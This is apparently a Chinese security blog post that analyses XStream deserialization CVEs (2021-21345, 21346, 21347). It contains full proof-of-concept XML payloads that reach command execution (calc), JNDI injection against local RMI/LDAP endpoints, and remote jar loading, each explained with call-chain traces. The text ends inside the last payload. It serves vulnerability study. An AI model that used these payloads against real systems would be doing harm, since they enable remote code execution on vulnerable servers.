<p>在write方法中，serializer无需赋值，会自动创建，由于jaxbType为JdbcRowSetImpl，所以进入第一层if，在第二层if中，由于obj为JdbcRowSetImpl对象，进入else分支，调用childAsXsiType方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304092342461.png" alt="image-20230409234212390"></p>
<p>在childAsXsiType方法中，child为该方法的第一个参数，也就是JdbcRowSetImpl对象，不等于null，进入else分支，将方法的第三个参数expected（ClassBeanInfoImpl）赋值给临时变量actual：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304092347295.png" alt="image-20230409234724180"></p>
<p>在else分支的后面，调用ClassBeanInfoImpl的serializeURIs方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304092345643.png" alt="image-20230409234545562"></p>
<p>在serializeURIs方法中，inheritedAttWildcard为GetterSetterReflection类实例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;inheritedAttWildcard class=&#x27;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection&#x27;&gt;</span><br><span class="line">	&lt;getter&gt;</span><br><span class="line">		&lt;class&gt;com.sun.rowset.JdbcRowSetImpl&lt;/class&gt;</span><br><span class="line">		&lt;name&gt;getDatabaseMetaData&lt;/name&gt;</span><br><span class="line">		&lt;parameter-types/&gt;</span><br><span class="line">	&lt;/getter&gt;</span><br><span class="line">&lt;/inheritedAttWildcard&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304092352118.png" alt="image-20230409235259016"></p>
<p>反射执行getDatabaseMetaData方法，传入构造好的JdbcRowSetImpl对象：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304092354086.png" alt="image-20230409235449999"></p>
<p>后面就是熟悉的JdbcRowSetImpl对象的利用链了，在getDatabaseMetaData方法中，调用connect方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304092357646.png" alt="image-20230409235727567"></p>
<p>将可控dataSource传入lookup，造成JNDI注入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;default&gt;</span><br><span class="line">	&lt;dataSource&gt;rmi://localhost:1097/Object&lt;/dataSource&gt;</span><br><span class="line">&lt;/default&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304092358094.png" alt="image-20230409235802019"></p>
<p>JNDI注入可以直接命令执行，原理是利用ResourceRef配合BeanFactory，使用ELProcessor执行EL表达式。</p>
<h2 id="CVE-2021-21345"><a href="#CVE-2021-21345" class="headerlink" title="CVE-2021-21345"></a>CVE-2021-21345</h2><h3 id="分析-10"><a href="#分析-10" class="headerlink" title="分析"></a>分析</h3><p>直接造成RCE，官方给的POC：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">  &lt;unserializable-parents/&gt;</span><br><span class="line">  &lt;java.util.PriorityQueue&gt;</span><br><span class="line">    &lt;default&gt;</span><br><span class="line">      &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">      &lt;comparator class=&#x27;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&#x27;&gt;</span><br><span class="line">        &lt;indexMap class=&#x27;com.sun.xml.internal.ws.client.ResponseContext&#x27;&gt;</span><br><span class="line">          &lt;packet&gt;</span><br><span class="line">            &lt;message class=&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&#x27;&gt;</span><br><span class="line">              &lt;dataSource class=&#x27;com.sun.xml.internal.ws.message.JAXBAttachment&#x27;&gt;</span><br><span class="line">                &lt;bridge class=&#x27;com.sun.xml.internal.ws.db.glassfish.BridgeWrapper&#x27;&gt;</span><br><span class="line">                  &lt;bridge class=&#x27;com.sun.xml.internal.bind.v2.runtime.BridgeImpl&#x27;&gt;</span><br><span class="line">                    &lt;bi class=&#x27;com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl&#x27;&gt;</span><br><span class="line">                      &lt;jaxbType&gt;com.sun.corba.se.impl.activation.ServerTableEntry&lt;/jaxbType&gt;</span><br><span class="line">                      &lt;uriProperties/&gt;</span><br><span class="line">                      &lt;attributeProperties/&gt;</span><br><span class="line">                      &lt;inheritedAttWildcard class=&#x27;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection&#x27;&gt;</span><br><span class="line">                        &lt;getter&gt;</span><br><span class="line">                          &lt;class&gt;com.sun.corba.se.impl.activation.ServerTableEntry&lt;/class&gt;</span><br><span class="line">                          &lt;name&gt;verify&lt;/name&gt;</span><br><span class="line">                          &lt;parameter-types/&gt;</span><br><span class="line">                        &lt;/getter&gt;</span><br><span class="line">                      &lt;/inheritedAttWildcard&gt;</span><br><span class="line">                    &lt;/bi&gt;</span><br><span class="line">                    &lt;tagName/&gt;</span><br><span class="line">                    &lt;context&gt;</span><br><span class="line">                      &lt;marshallerPool class=&#x27;com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1&#x27;&gt;</span><br><span class="line">                        &lt;outer-class reference=&#x27;../..&#x27;/&gt;</span><br><span class="line">                      &lt;/marshallerPool&gt;</span><br><span class="line">                      &lt;nameList&gt;</span><br><span class="line">                        &lt;nsUriCannotBeDefaulted&gt;</span><br><span class="line">                          &lt;boolean&gt;true&lt;/boolean&gt;</span><br><span class="line">                        &lt;/nsUriCannotBeDefaulted&gt;</span><br><span class="line">                        &lt;namespaceURIs&gt;</span><br><span class="line">                          &lt;string&gt;1&lt;/string&gt;</span><br><span class="line">                        &lt;/namespaceURIs&gt;</span><br><span class="line">                        &lt;localNames&gt;</span><br><span class="line">                          &lt;string&gt;UTF-8&lt;/string&gt;</span><br><span class="line">                        &lt;/localNames&gt;</span><br><span class="line">                      &lt;/nameList&gt;</span><br><span class="line">                    &lt;/context&gt;</span><br><span class="line">                  &lt;/bridge&gt;</span><br><span class="line">                &lt;/bridge&gt;</span><br><span class="line">                &lt;jaxbObject class=&#x27;com.sun.corba.se.impl.activation.ServerTableEntry&#x27;&gt;</span><br><span class="line">                  &lt;activationCmd&gt;calc&lt;/activationCmd&gt;</span><br><span class="line">                &lt;/jaxbObject&gt;</span><br><span class="line">              &lt;/dataSource&gt;</span><br><span class="line">            &lt;/message&gt;</span><br><span class="line">            &lt;satellites/&gt;</span><br><span class="line">            &lt;invocationProperties/&gt;</span><br><span class="line">          &lt;/packet&gt;</span><br><span class="line">        &lt;/indexMap&gt;</span><br><span class="line">      &lt;/comparator&gt;</span><br><span class="line">    &lt;/default&gt;</span><br><span class="line">    &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">    &lt;string&gt;javax.xml.ws.binding.attachments.inbound&lt;/string&gt;</span><br><span class="line">    &lt;string&gt;javax.xml.ws.binding.attachments.inbound&lt;/string&gt;</span><br><span class="line">  &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure>

<p>跟上条链三分之二的地方相同，就是触发getter的类和方法改变了，变成了ServerTableEntry的verify方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101119497.png" alt="image-20230410111922304"></p>
<p>在verify方法中，这类也是比较直接，直接 Runtime.getRuntime().exec(activationCmd);执行命令。</p>
<p>整个调用链如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">com.sun.corba.se.impl.activation.ServerTableEntry.verify(ServerTableEntry.java:173)</span><br><span class="line">...</span><br><span class="line">java.lang.reflect.Method.invoke</span><br><span class="line">Accessor$GetterSetterReflection.get</span><br><span class="line">ClassBeanInfoImpl.serializeURIs</span><br><span class="line">XMLSerializer.childAsXsiType</span><br><span class="line">MarshallerImpl.write</span><br><span class="line">BridgeImpl.marshal</span><br><span class="line">Bridge.marshal</span><br><span class="line">BridgeWrapper.marshal</span><br><span class="line">JAXBAttachment.writeTo</span><br><span class="line">JAXBAttachment.asInputStream</span><br><span class="line">JAXBAttachment.getInputStream</span><br><span class="line">XMLMessage$XMLMultiPart.getMessage</span><br><span class="line">XMLMessage$XMLMultiPart.getAttachments</span><br><span class="line">MessageWrapper.getAttachments</span><br><span class="line">ResponseContext.get</span><br><span class="line">DataTransferer$IndexedComparator.compareIndices</span><br><span class="line">DataTransferer$IndexOrderComparator.compare</span><br><span class="line">PriorityQueue.siftDownUsingComparator</span><br><span class="line">PriorityQueue.siftDown</span><br><span class="line">PriorityQueue.heapify</span><br><span class="line">PriorityQueue.readObject</span><br></pre></td></tr></table></figure>

<p>可以使用xml对类对象的某些属性赋值，然后使用Accessor$GetterSetterReflection.get触发类对象任意的方法，这就之后为后续的RCE做铺垫，因为很多类的方法中就包括了命令执行等危险操作。</p>
<p>使用jaxbObject指定要实例化的对象，并为它的某些属性赋值：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;jaxbObject class=&#x27;com.sun.corba.se.impl.activation.ServerTableEntry&#x27;&gt;</span><br><span class="line">	&lt;activationCmd&gt;calc&lt;/activationCmd&gt;</span><br><span class="line">&lt;/jaxbObject&gt;</span><br></pre></td></tr></table></figure>

<p>使用inheritedAttWildcard标签去执行跟jaxbObject标签对应对象的方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;inheritedAttWildcard class=&#x27;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection&#x27;&gt;</span><br><span class="line">	&lt;getter&gt;</span><br><span class="line">		&lt;class&gt;com.sun.corba.se.impl.activation.ServerTableEntry&lt;/class&gt;</span><br><span class="line">		&lt;name&gt;verify&lt;/name&gt;</span><br><span class="line">		&lt;parameter-types/&gt;</span><br><span class="line">	&lt;/getter&gt;</span><br><span class="line">&lt;/inheritedAttWildcard&gt;</span><br></pre></td></tr></table></figure>



<h2 id="CVE-2021-21346"><a href="#CVE-2021-21346" class="headerlink" title="CVE-2021-21346"></a>CVE-2021-21346</h2><h3 id="分析-11"><a href="#分析-11" class="headerlink" title="分析"></a>分析</h3><p>该漏洞造成JNDI注入，官方给的POC：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;sorted-set&gt;</span><br><span class="line">  &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">    &lt;type&gt;ysomap&lt;/type&gt;</span><br><span class="line">    &lt;value class=&#x27;javax.swing.MultiUIDefaults&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">      &lt;unserializable-parents/&gt;</span><br><span class="line">      &lt;hashtable&gt;</span><br><span class="line">        &lt;default&gt;</span><br><span class="line">          &lt;loadFactor&gt;0.75&lt;/loadFactor&gt;</span><br><span class="line">          &lt;threshold&gt;525&lt;/threshold&gt;</span><br><span class="line">        &lt;/default&gt;</span><br><span class="line">        &lt;int&gt;700&lt;/int&gt;</span><br><span class="line">        &lt;int&gt;0&lt;/int&gt;</span><br><span class="line">      &lt;/hashtable&gt;</span><br><span class="line">      &lt;javax.swing.UIDefaults&gt;</span><br><span class="line">        &lt;default&gt;</span><br><span class="line">          &lt;defaultLocale&gt;zh_CN&lt;/defaultLocale&gt;</span><br><span class="line">          &lt;resourceCache/&gt;</span><br><span class="line">        &lt;/default&gt;</span><br><span class="line">      &lt;/javax.swing.UIDefaults&gt;</span><br><span class="line">      &lt;javax.swing.MultiUIDefaults&gt;</span><br><span class="line">        &lt;default&gt;</span><br><span class="line">          &lt;tables&gt;</span><br><span class="line">            &lt;javax.swing.UIDefaults serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">              &lt;unserializable-parents/&gt;</span><br><span class="line">              &lt;hashtable&gt;</span><br><span class="line">                &lt;default&gt;</span><br><span class="line">                  &lt;loadFactor&gt;0.75&lt;/loadFactor&gt;</span><br><span class="line">                  &lt;threshold&gt;525&lt;/threshold&gt;</span><br><span class="line">                &lt;/default&gt;</span><br><span class="line">                &lt;int&gt;700&lt;/int&gt;</span><br><span class="line">                &lt;int&gt;1&lt;/int&gt;</span><br><span class="line">                &lt;sun.swing.SwingLazyValue&gt;</span><br><span class="line">                  &lt;className&gt;javax.naming.InitialContext&lt;/className&gt;</span><br><span class="line">                  &lt;methodName&gt;doLookup&lt;/methodName&gt;</span><br><span class="line">                  &lt;args&gt;</span><br><span class="line">                    &lt;arg&gt;ldap://localhost:1099/CallRemoteMethod&lt;/arg&gt;</span><br><span class="line">                  &lt;/args&gt;</span><br><span class="line">                &lt;/sun.swing.SwingLazyValue&gt;</span><br><span class="line">              &lt;/hashtable&gt;</span><br><span class="line">              &lt;javax.swing.UIDefaults&gt;</span><br><span class="line">                &lt;default&gt;</span><br><span class="line">                  &lt;defaultLocale reference=&#x27;../../../../../../../javax.swing.UIDefaults/default/defaultLocale&#x27;/&gt;</span><br><span class="line">                  &lt;resourceCache/&gt;</span><br><span class="line">                &lt;/default&gt;</span><br><span class="line">              &lt;/javax.swing.UIDefaults&gt;</span><br><span class="line">            &lt;/javax.swing.UIDefaults&gt;</span><br><span class="line">          &lt;/tables&gt;</span><br><span class="line">        &lt;/default&gt;</span><br><span class="line">      &lt;/javax.swing.MultiUIDefaults&gt;</span><br><span class="line">    &lt;/value&gt;</span><br><span class="line">  &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">  &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">    &lt;type&gt;ysomap&lt;/type&gt;</span><br><span class="line">    &lt;value class=&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;&gt;</span><br><span class="line">      &lt;m__obj class=&#x27;string&#x27;&gt;test&lt;/m__obj&gt;</span><br><span class="line">    &lt;/value&gt;</span><br><span class="line">  &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">&lt;/sorted-set&gt;</span><br></pre></td></tr></table></figure>

<p>无法直接运行，我在原作者blog找到了POC可以直接运行，原来官方POC缺少一些属性还有将string标签写成了arg，同时简化了一下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;sorted-set&gt;</span><br><span class="line">  &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">    &lt;type&gt;ysomap&lt;/type&gt;</span><br><span class="line">    &lt;value class=&#x27;javax.swing.MultiUIDefaults&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">      &lt;unserializable-parents/&gt;</span><br><span class="line">      &lt;hashtable&gt;</span><br><span class="line">        &lt;default /&gt;</span><br><span class="line">        &lt;int&gt;700&lt;/int&gt;</span><br><span class="line">        &lt;int&gt;0&lt;/int&gt;</span><br><span class="line">      &lt;/hashtable&gt;</span><br><span class="line">      &lt;javax.swing.MultiUIDefaults&gt;</span><br><span class="line">        &lt;default&gt;</span><br><span class="line">          &lt;tables&gt;</span><br><span class="line">            &lt;javax.swing.UIDefaults serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">              &lt;unserializable-parents/&gt;</span><br><span class="line">              &lt;hashtable&gt;</span><br><span class="line">                &lt;default /&gt;</span><br><span class="line">                &lt;int&gt;700&lt;/int&gt;</span><br><span class="line">                &lt;int&gt;1&lt;/int&gt;</span><br><span class="line">                &lt;string&gt;lazyValue&lt;/string&gt;</span><br><span class="line">                &lt;sun.swing.SwingLazyValue&gt;</span><br><span class="line">                  &lt;className&gt;javax.naming.InitialContext&lt;/className&gt;</span><br><span class="line">                  &lt;methodName&gt;doLookup&lt;/methodName&gt;</span><br><span class="line">                  &lt;args&gt;</span><br><span class="line">                    &lt;string&gt;rmi://localhost:1097/Object&lt;/string&gt;</span><br><span class="line">                  &lt;/args&gt;</span><br><span class="line">                &lt;/sun.swing.SwingLazyValue&gt;</span><br><span class="line">              &lt;/hashtable&gt;</span><br><span class="line">            &lt;/javax.swing.UIDefaults&gt;</span><br><span class="line">          &lt;/tables&gt;</span><br><span class="line">        &lt;/default&gt;</span><br><span class="line">      &lt;/javax.swing.MultiUIDefaults&gt;</span><br><span class="line">    &lt;/value&gt;</span><br><span class="line">  &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">  &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">    &lt;type&gt;ysomap&lt;/type&gt;</span><br><span class="line">    &lt;value class=&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27; /&gt;</span><br><span class="line">  &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">&lt;/sorted-set&gt;</span><br></pre></td></tr></table></figure>

<p>利用链：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">at javax.naming.InitialContext.doLookup(InitialContext.java:290)</span><br><span class="line">...</span><br><span class="line">at java.lang.reflect.Method.invoke(Method.java:498)</span><br><span class="line">at sun.swing.SwingLazyValue.createValue(SwingLazyValue.java:73)</span><br><span class="line">at javax.swing.UIDefaults.getFromHashtable(UIDefaults.java:216)</span><br><span class="line">at javax.swing.UIDefaults.get(UIDefaults.java:161)</span><br><span class="line">at javax.swing.MultiUIDefaults.get(MultiUIDefaults.java:64)</span><br><span class="line">at javax.swing.MultiUIDefaults.toString(MultiUIDefaults.java:197)</span><br><span class="line">at com.sun.org.apache.xpath.internal.objects.XString.equals(XString.java:391)</span><br><span class="line">at javax.naming.ldap.Rdn$RdnEntry.compareTo(Rdn.java:441)</span><br><span class="line">at javax.naming.ldap.Rdn$RdnEntry.compareTo(Rdn.java:420)</span><br><span class="line">at java.util.TreeMap.put(TreeMap.java:568)</span><br><span class="line">at java.util.AbstractMap.putAll(AbstractMap.java:281)</span><br><span class="line">at java.util.TreeMap.putAll(TreeMap.java:327)</span><br><span class="line">at com.thoughtworks.xstream.converters.collections.TreeMapConverter.populateTreeMap(TreeMapConverter.java:121)</span><br><span class="line">at com.thoughtworks.xstream.converters.collections.TreeSetConverter.unmarshal(TreeSetConverter.java:92)</span><br><span class="line">at com.thoughtworks.xstream.core.TreeUnmarshaller.convert(TreeUnmarshaller.java:72)</span><br><span class="line">at com.thoughtworks.xstream.core.AbstractReferenceUnmarshaller.convert(AbstractReferenceUnmarshaller.java:72)</span><br><span class="line">at com.thoughtworks.xstream.core.TreeUnmarshaller.convertAnother(TreeUnmarshaller.java:66)</span><br><span class="line">at com.thoughtworks.xstream.core.TreeUnmarshaller.convertAnother(TreeUnmarshaller.java:50)</span><br><span class="line">at com.thoughtworks.xstream.core.TreeUnmarshaller.start(TreeUnmarshaller.java:134)</span><br><span class="line">at com.thoughtworks.xstream.core.AbstractTreeMarshallingStrategy.unmarshal(AbstractTreeMarshallingStrategy.java:32)</span><br><span class="line">at com.thoughtworks.xstream.XStream.unmarshal(XStream.java:1409)</span><br><span class="line">at com.thoughtworks.xstream.XStream.unmarshal(XStream.java:1388)</span><br><span class="line">at com.thoughtworks.xstream.XStream.fromXML(XStream.java:1273)</span><br><span class="line">at com.thoughtworks.xstream.XStream.fromXML(XStream.java:1264)</span><br><span class="line">at org.example.Main.main(Main.java:56)</span><br></pre></td></tr></table></figure>

<p>细节：两个javax.naming.ldap.Rdn_-RdnEntry标签。sorted-set标签的默认实现为TreeSet，而为了达到有序的目的，TreeSet内部使用TreeMap来实现有序性，当使用TreeSet的add方法添加元素时，实际上都是将元素作为key添加到它的TreeMap属性，value为PRESENT（为空Object）：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101339070.png" alt="image-20230410133901008"></p>
<p>这里的调用链一开始的部分和CVE-2013-7285的一样，直接从AbstractMap.putAll看起。</p>
<p>两个javax.naming.ldap.Rdn_-RdnEntry标签代表往TreeMap存入两个key，key都为javax.naming.ldap.Rdn_-RdnEntryw对象。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101330800.png" alt="image-20230410133042727"></p>
<p>当第一次循环时，通过getKey方法获取第一个javax.naming.ldap.Rdn_-RdnEntryw对象，然后进入put方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101244214.png" alt="image-20230410124430993"></p>
<p>在put方法中，由于root初始化时为null，所以t也为null，然后将创建一个新的Entry，将key（javax.naming.ldap.Rdn_-RdnEntryw对象）放入，并将新的Entry赋值给root，此时root属性就为TreeMap中的第一个Entry。然后返回null，进入第二次循环：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101330800.png" alt="image-20230410133042727"></p>
<p>第二次循环中，进入put方法查看：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101346213.png" alt="image-20230410134658130"></p>
<p>调用第二个元素的key（对应第二个标签的javax.naming.ldap.Rdn_-RdnEntryw对象）的compareTo方法，将第一个元素的key作为参数传入（对应第一个标签的javax.naming.ldap.Rdn_-RdnEntryw对象）。</p>
<p>这里调用的是第二个标签对象（javax.naming.ldap.Rdn_-RdnEntry）的value属性（XString类实例）的equals方法，同时传入第一个标签对象（javax.naming.ldap.Rdn_-RdnEntry）的value属性（MultiUIDefaults类实例）：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101350896.png" alt="image-20230410135023816"></p>
<p>在equals方法中，直接调用MultiUIDefaults类实例的toString方法，跟进：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101353734.png" alt="image-20230410135337676"></p>
<p>在toString方法中，先进入keys方法查看：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101449625.png" alt="image-20230410144906545"></p>
<p>在keys方法里创建了个MultiUIDefaultsEnumerator对象并将它返回，进入entrySet方法查看：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101449178.png" alt="image-20230410144929118"></p>
<p>在entrySet方法里，创建了个HashSet对象用来存放Entry类，然后将tables里元素化成Entry实例存入新创建的HashSet对象并返回（tables为UIDefaults数组，UIDefaults类的父类为Hashtable，UIDefaults类没有entrySet方法，而他的父类有，就会调用父类的entrySet方法）：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101450243.png" alt="image-20230410145057183"></p>
<p>返回Hashtable的entrySet属性：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101530441.png" alt="image-20230410153017372"></p>
<p>这里的entrySet属性怎么来的呢？</p>
<p>这里需要先看看tables属性存了什么，xml中的tables标签只有一个子标签，代表UIDefaults数组只有一个UIDefaults类实例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;tables&gt;</span><br><span class="line">	&lt;javax.swing.UIDefaults serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">		&lt;unserializable-parents/&gt;</span><br><span class="line">		&lt;hashtable&gt;</span><br><span class="line">			&lt;default /&gt;</span><br><span class="line">			&lt;int&gt;700&lt;/int&gt;</span><br><span class="line">			&lt;int&gt;1&lt;/int&gt;</span><br><span class="line">			&lt;string&gt;lazyValue&lt;/string&gt;</span><br><span class="line">			&lt;sun.swing.SwingLazyValue&gt;</span><br><span class="line">				&lt;className&gt;javax.naming.InitialContext&lt;/className&gt;</span><br><span class="line">				&lt;methodName&gt;doLookup&lt;/methodName&gt;</span><br><span class="line">				&lt;args&gt;</span><br><span class="line">					&lt;string&gt;rmi://localhost:1097/Object&lt;/string&gt;</span><br><span class="line">				&lt;/args&gt;</span><br><span class="line">			&lt;/sun.swing.SwingLazyValue&gt;</span><br><span class="line">		&lt;/hashtable&gt;</span><br><span class="line">	&lt;/javax.swing.UIDefaults&gt;</span><br><span class="line">&lt;/tables&gt;</span><br></pre></td></tr></table></figure>

<p>前面说过unserializable-parents标签代表默认不反序列化父类，但是如果父类的标签在下面就会反序列化，UIDefaults的父类为Hashtable，hashtable标签里的子标签跟Hashtable在readObject方法中一一对应：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101458701.png" alt="image-20230410145851599"></p>
<p>在readObject方法末端，调用reconstitutionPut方法，将key和value封装成Entry，并放入Hashtable的table属性中。这里的table属性会和上面的entrySet属性同步，table属性有啥，entrySet属性就有啥。</p>
<p>所以说entrySet属性存了一个Entry，key为string标签的内容lazyValue，value为SwingLazyValue类实例。</p>
<p>回到这里，然后创建对象，传参：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101449178.png" alt="image-20230410144929118"></p>
<p>将参数赋给两个属性，第二个是将hashset的迭代器赋给iterator属性：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101506254.png" alt="image-20230410150604169"></p>
<p>回到toString方法中，调用nextElement方法获取元素：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101508955.png" alt="image-20230410150809862"></p>
<p>在nextElement方法中，iterator.next()获取到Entry实例，通过getKey获取到lazyValue字符串：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101509124.png" alt="image-20230410150931066"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101527484.png" alt="image-20230410152753426"></p>
<p>回到toString方法中，然后调用get方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101510124.png" alt="image-20230410151004009"></p>
<p>在get方法中，调用父类的get方法中获取不到lazyValue键对应的值（注意！我们未设置第一个hashtable标签的key和value，而是给tables标签下的hashtable设置了key和value）：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101551243.png" alt="image-20230410155120167"></p>
<p>然后循环tables数组，调用UIDefaults的get方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101555363.png" alt="image-20230410155505254"></p>
<p>在get方法中又调用了getFromHashtable方法。在getFromHashtable方法中，此时就能获取到value（因为它此时从tables属性里的UIDefaults的父类Hashtable获取的值）：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101556041.png" alt="image-20230410155625945"></p>
<p>在getFromHashtable方法的后面，通过获取到的value对象（SwingLazyValue），调用它的createValue方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101557323.png" alt="image-20230410155735236"></p>
<p>在createValue方法中，注册InitialContext类，然后获取该类的doLookup方法，然后执行该方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101559027.png" alt="image-20230410155950962"></p>
<p>在doLookup，造成JNDI注入：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101601773.png" alt="image-20230410160128697"></p>
<h3 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h3><p>想把这个漏洞描述清楚很难，因为中间涉及一些细节，很难把这些细节讲清楚，只有动手调试才能理解。</p>
<h2 id="CVE-2021-21347"><a href="#CVE-2021-21347" class="headerlink" title="CVE-2021-21347"></a>CVE-2021-21347</h2><h3 id="分析-12"><a href="#分析-12" class="headerlink" title="分析"></a>分析</h3><p>这个漏洞会加载远程jar包，并实例化jar包里指定的类。</p>
<p>官方POC：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">  &lt;unserializable-parents/&gt;</span><br><span class="line">  &lt;java.util.PriorityQueue&gt;</span><br><span class="line">    &lt;default&gt;</span><br><span class="line">      &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">      &lt;comparator class=&#x27;javafx.collections.ObservableList$1&#x27;/&gt;</span><br><span class="line">    &lt;/default&gt;</span><br><span class="line">    &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">    &lt;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&gt;</span><br><span class="line">      &lt;dataHandler&gt;</span><br><span class="line">        &lt;dataSource class=&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;&gt;</span><br><span class="line">          &lt;contentType&gt;text/plain&lt;/contentType&gt;</span><br><span class="line">          &lt;is class=&#x27;java.io.SequenceInputStream&#x27;&gt;</span><br><span class="line">            &lt;e class=&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;&gt;</span><br><span class="line">              &lt;iterator class=&#x27;com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator&#x27;&gt;</span><br><span class="line">                &lt;names class=&#x27;java.util.AbstractList$Itr&#x27;&gt;</span><br><span class="line">                  &lt;cursor&gt;0&lt;/cursor&gt;</span><br><span class="line">                  &lt;lastRet&gt;-1&lt;/lastRet&gt;</span><br><span class="line">                  &lt;expectedModCount&gt;0&lt;/expectedModCount&gt;</span><br><span class="line">                  &lt;outer-class class=&#x27;java.util.Arrays$ArrayList&#x27;&gt;</span><br><span class="line">                    &lt;a class=&#x27;string-array&#x27;&gt;</span><br><span class="line">                      &lt;string&gt;Evil&lt;/string&gt;</span><br><span class="line">                    &lt;/a&gt;</span><br><span class="line">                  &lt;/outer-class&gt;</span><br><span class="line">                &lt;/names&gt;</span><br><span class="line">                &lt;processorCL class=&#x27;java.net.URLClassLoader&#x27;&gt;</span><br><span class="line">                  &lt;ucp class=&#x27;sun.misc.URLClassPath&#x27;&gt;</span><br><span class="line">                    &lt;urls serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                      &lt;unserializable-parents/&gt;</span><br><span class="line">                      &lt;vector&gt;</span><br><span class="line">                        &lt;default&gt;</span><br><span class="line">                          &lt;capacityIncrement&gt;0&lt;/capacityIncrement&gt;x</span><br><span class="line">                          &lt;elementCount&gt;1&lt;/elementCount&gt;</span><br><span class="line">                          &lt;elementData&gt;</span><br><span class="line">                            